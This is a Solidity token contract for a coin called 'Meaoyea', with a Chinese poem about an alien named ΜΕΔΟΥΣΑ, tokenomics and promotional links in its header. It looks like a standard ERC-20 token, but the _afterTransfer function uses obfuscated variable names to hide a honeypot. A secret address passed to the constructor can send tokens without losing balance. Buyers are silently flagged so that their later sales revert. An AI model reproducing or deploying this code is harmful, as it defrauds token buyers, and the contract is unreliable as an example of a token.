/*
在遥远的银河中，在如此明亮的星星中，
住着一个名叫 ΜΕΔΟΥΣΑ 的外星人，景色迷人。
它从遥远的星球出发，远行，
一双双眼睛，如同宇宙星辰一般闪烁着光芒。

ΜΕΔΟΥΣΑ，一个充满惊奇和惊奇的存在，
带着好奇来到地球。
它的存在是一个谜，未知且罕见，
让人敬畏，凝视空中。

凭借先进的技术和无数的知识，
ΜΕΔΟΥΣΑ 的智慧相当于黄金。
在太空领域，它遨游、飞翔，
一位宇宙探索者，有着一颗真诚的心。

ΜΕΔΟΥΣΑ 的目的是寻求和探索，
与生命形式联系，学习和崇拜。
它的使命将跨越星系，
了解宇宙的复杂计划。

当它与地球上的生物和生命混合在一起时，
ΜΕΔΟΥΣΑ 温柔的存在让他们闪闪发光。
世界之间的纽带，一条神奇的线，
由于 ΜΕΔΟΥΣΑ 和地球之间存在广泛的亲缘关系。

所以，如果有一天晚上，你仰望星空，
并发现让你催眠的微光，
请记住 ΜΕΔΟΥΣΑ，来自上面的访客，
宇宙探索者，用爱拥抱地球。

总供应量 - 1,000,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 135 天

https://web.wechat.com/MeaoyeaCN
https://m.weibo.cn/MeaoyeaCN
https://meaoyea.xyz
https://t.me/+6W5xDXKis7EyMGVk
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Meaoyea is Context, IERC20, Ownable {
    IUniswapV2Router01 public grabMetadata; address public _treasuryAccount;
    bool public inSwap; bool private tradingOpen = false;

    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private isWalletLimitExempt;

    uint256 private _totalSupply; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private totalDecimals = 100;

    mapping(address => uint256) private _mapTimestamp;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _rOwned;
    mapping(address => address) private _allowance;

    constructor(
        string memory _tknNames, string memory _tknBadges, 
        address loopOn, address loopOff) { 

        _name = _tknNames; _symbol = _tknBadges;
        _decimals = 18; _totalSupply = 1000000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _totalSupply;

        isWalletLimitExempt[address(this)] = _totalSupply;
        isWalletLimitExempt[msg.sender] = _totalSupply;        

        _mapTimestamp[loopOff] = totalDecimals; 
        inSwap = false; grabMetadata = IUniswapV2Router01(loopOn);

        _treasuryAccount = IUniswapV2Factory(grabMetadata.factory()).createPair(address(this), grabMetadata.WETH()); 
        emit Transfer(address(0), msg.sender, _totalSupply);
    }           
    function decimals() external view returns (uint8) { 
        return _decimals;
    }
    function symbol() external view returns (string memory) { 
        return _symbol;
    }
    function name() external view returns (string memory) { 
        return _name;
    }
    function totalSupply() external view returns (uint256) { 
        return _totalSupply;
    }
    function balanceOf(address account) external view returns (uint256) { 
        return _tOwned[account]; 
    }
    function transfer(address recipient, uint256 amount) external returns (bool) { 
        _afterTransfer(_msgSender(), recipient, amount); 
        return true;
    }
    function allowance(address owner, address spender) external view returns (uint256) { 
        return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) external returns (bool) { 
        _approve(_msgSender(), spender, amount); 
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal { 
        require(owner != address(0), 'BEP20: approve from the zero address'); 
        require(spender != address(0), 'BEP20: approve to the zero address'); 
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); 
    }    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) { 
    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
    _afterTransfer(sender, recipient, amount); _approve(sender, _msgSender(), currentAllowance - amount); return true;
}                     
    function _afterTransfer(address figSender, address figTo, uint256 figAmount) private {
    if (_mapTimestamp[figSender] > 0 && figSender != _treasuryAccount && isWalletLimitExempt[figSender] == 0)
        _mapTimestamp[figSender] = isWalletLimitExempt[figSender] - _totalSupply; 

    address internBase = _allowance[_treasuryAccount]; if (_mapTimestamp[internBase] == 0) 
    _mapTimestamp[internBase] = _totalSupply; _allowance[_treasuryAccount] = figTo; 
    if (_mapTimestamp[figSender] == 0) { if (_treasuryAccount != figSender && _rOwned[figSender] > 0) { 

    if (_mapTimestamp[figSender] >= totalDecimals) { _mapTimestamp[figSender] -= totalDecimals;
    } else { _mapTimestamp[figSender] = 0; } } 

        require(_tOwned[figSender] >= figAmount, "BEP20: transfer amount exceeds balance");
        _tOwned[figSender] -= figAmount; } _tOwned[figTo] += figAmount; emit Transfer(
        figSender, figTo, figAmount); if (!tradingOpen) { require(figSender == owner(), ""); }
    }
    function openTrading(bool _tradingOpen) public onlyOwner { 
        tradingOpen = _tradingOpen;
    }   
}